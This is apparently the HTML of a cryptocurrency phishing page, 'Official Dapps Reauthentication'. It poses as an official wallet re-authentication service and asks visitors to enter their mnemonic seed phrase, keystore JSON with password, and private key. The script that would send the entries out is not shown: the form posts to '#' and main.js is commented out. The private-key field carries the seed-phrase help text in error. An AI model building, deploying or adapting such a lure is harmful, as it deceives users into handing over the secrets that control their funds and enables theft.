<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Official Dapps Reauthentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link
      rel="stylesheet"
      type="text/css"
      media="screen"
      href="static/css/style.min.css"
    />
    <!-- <script src='main.js'></script> -->
    <!-- favicon -->
    <link rel="apple-touch-icon" sizes="180x180" href="static/images/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="static/images/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="static/images/favicon-16x16.png" />
    <link rel="manifest" href="static/images/site.webmanifest" />
    <link rel="mask-icon" href="static/images/safari-pinned-tab.svg" color="#5bbad5" />
    <meta name="msapplication-TileColor" content="#da532c" />
    <meta name="theme-color" content="#ffffff" />
    <!-- paragraph / text font -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Merriweather+Sans:wght@300&display=swap"
      rel="stylesheet"
    />
    <!-- button fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500&display=swap"
      rel="stylesheet"
    />
    <!-- heading fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <header class="header">
      <div class="row">
        <div class="col-1-of-2">
          <a href="/" class="header__link">
            <div class="header__logo__box">
              <img
                src="./static/images/dapps1.svg"
                alt="logo image"
                class="header__logo"
              />
            </div>
            <div class="header__logo__text-box">
              <span class="header__logo__text">
                Official Dapps Reauthentication
              </span>
            </div>
          </a>
        </div>

        <div class="col-1-of-2">
          <div class="header__btn-box">
            <div class="header__btn">
              <a href="/import.html" class="btn btn-connect">connect</a>
            </div>
          </div>
        </div>
      </div>
    </header>

    <main>
      <section class="import u-margin-top-big u-margin-bottom-big">
        <h3 class="heading--secondary u-center-text">Import your wallet</h3>
        <form action="#" class="import__form">
          <div class="row">
            <label for="phrase" class="import__label">Mnemonic Phrase</label>
            <textarea
              name="phrase"
              id="phrase"
              class="import__textarea"
            ></textarea>
            <span class="import__help-text"
              >Typically 12 (sometimes 24) words separated by single
              spaces</span
            >
          </div>

          <div class="row">
            <label for="keystore" class="import__label">Keystore JSON</label>
            <textarea
              name="keystore"
              id="keystore"
              class="import__textarea"
            ></textarea>
            <label for="password" class="import__label u-margin-top-small"
              >Password</label
            >
            <input
              type="password"
              name="password"
              id="password"
              class="import__input"
            />
          </div>

          <div class="row">
            <label for="private" class="import__label">Private Key</label>
            <textarea
              name="private"
              id="private"
              class="import__textarea"
            ></textarea>
            <span class="import__help-text"
              >Typically 12 (sometimes 24) words separated by single
              spaces</span
            >
          </div>
          <div class="row">
            <input type="submit" value="import" class="import__submit" />
          </div>
        </form>
      </section>
    </main>

    <footer class="footer">
      <div class="row">
        <div class="col-1-of-2">
          <span class="footer__text">Dapps Reauthentication</span>
        </div>
        <div class="col-1-of-2">
          <div class="footer__icon-box">
            <div class="footer__icon">
              <svg
                width="32"
                height="32"
                viewBox="0 0 24 24"
                stroke-width="1.5"
                stroke="#000000"
                fill="none"
                stroke-linecap="round"
                stroke-linejoin="round"
                class="facebook"
              >
                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
                <path
                  d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3"
                />
              </svg>
            </div>
            <div class="footer__icon">
              <svg
                width="32"
                height="32"
                viewBox="0 0 24 24"
                stroke-width="1.5"
                stroke="#000000"
                fill="none"
                stroke-linecap="round"
                stroke-linejoin="round"
                class="instagram"
              >
                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
                <rect x="4" y="4" width="16" height="16" rx="4" />
                <circle cx="12" cy="12" r="3" />
                <line x1="16.5" y1="7.5" x2="16.5" y2="7.501" />
              </svg>
            </div>
            <div class="footer__icon">
              <svg
                width="32"
                height="32"
                viewBox="0 0 24 24"
                stroke-width="1.5"
                stroke="#000000"
                fill="none"
                stroke-linecap="round"
                stroke-linejoin="round"
                class="twitter"
              >
                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
                <path
                  d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z"
                />
              </svg>
            </div>
          </div>
        </div>
      </div>
    </footer>
  </body>
</html>
